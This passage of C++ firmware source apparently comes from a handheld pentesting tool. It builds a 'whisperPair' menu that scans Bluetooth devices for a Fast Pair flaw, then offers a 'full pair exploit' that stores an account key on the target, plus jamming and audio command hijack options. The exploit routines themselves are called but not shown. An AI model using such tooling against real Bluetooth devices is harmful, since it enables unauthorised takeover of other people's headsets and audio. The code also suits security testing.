    jamOptions.push_back({"[Back]", []() {}});
    
    loopOptions(jamOptions, MENU_TYPE_SUBMENU, "JAM & CONNECT", 0, false);
}

void whisperPairMenu() {
    std::vector<Option> options;
    returnToMenu = false;

    options.push_back({"[Scan & Test]", []() {
        testFastPairVulnerability();
    }});

    options.push_back({"[Check Device]", []() {
        String selectedInfo = selectTargetFromScan("CHECK DEVICE");
        if(selectedInfo.isEmpty()) return;
        
        int colonPos = selectedInfo.lastIndexOf(':');
        if(colonPos == -1) {
            showErrorMessage("Invalid device info");
            return;
        }
        
        String selectedMAC = selectedInfo.substring(0, colonPos);
        uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
        
        NimBLEAddress target;
        try {
            target = NimBLEAddress(selectedMAC.c_str(), addrType);
        } catch (...) {
            showErrorMessage("Invalid MAC address");
            return;
        }
        
        checkIfFastPairDevice(target);
    }});

    options.push_back({"[Full Pair Test]", []() {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("FULL PAIR EXPLOIT");
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(1);

        tft.fillRect(20, 50, tftWidth - 40, 150, bruceConfig.bgColor);

        int lineHeight = 18;
        int startY = 50;

        tft.setCursor(20, startY);
        tft.print("This will attempt full pairing:");

        tft.setCursor(20, startY + lineHeight);
        tft.print("1. Connect to target");

        tft.setCursor(20, startY + (lineHeight * 2));
        tft.print("2. ECDH key exchange");

        tft.setCursor(20, startY + (lineHeight * 3));
        tft.print("3. Complete pairing");

        tft.setCursor(20, startY + (lineHeight * 4));
        tft.print("4. Store account key");

        tft.fillRect(20, startY + (lineHeight * 5) + 10, tftWidth - 40, 30, bruceConfig.bgColor);
        tft.setCursor(20, startY + (lineHeight * 5) + 10);
        tft.print("SEL: Continue  ESC: Cancel");

        while(true) {
            if(check(EscPress)) return;
            if(check(SelPress)) break;
            delay(50);
        }

        String selectedInfo = selectTargetFromScan("SELECT TARGET");
        if(selectedInfo.isEmpty()) return;

        int colonPos = selectedInfo.lastIndexOf(':');
        if(colonPos == -1) {
            showErrorMessage("Invalid device info");
            return;
        }

        String selectedMAC = selectedInfo.substring(0, colonPos);
        uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();

        NimBLEAddress target;
        try {
            target = NimBLEAddress(selectedMAC.c_str(), addrType);
        } catch (...) {
            showErrorMessage("Invalid MAC address");
            return;
        }

        int8_t confirm = displayMessage("Confirm full exploit?", "No", "Yes", "Back", TFT_YELLOW);
        if(confirm != 1) return;

        bool success = whisperPairFullExploit(target);
        if(success) {
            showSuccessMessage("EXPLOIT SUCCESSFUL!");
        } else {
            showErrorMessage("Exploit failed");
        }
    }});

    options.push_back({"[Jam & Connect]", []() {
        jamAndConnectMenu();
    }});

    options.push_back({"[Audio CMD Hijack]", []() {
        audioCommandHijackTest();
    }});

    options.push_back({"[Back]", []() { returnToMenu = true; }});

    loopOptions(options, MENU_TYPE_SUBMENU, "whisperPair", 0, false);
}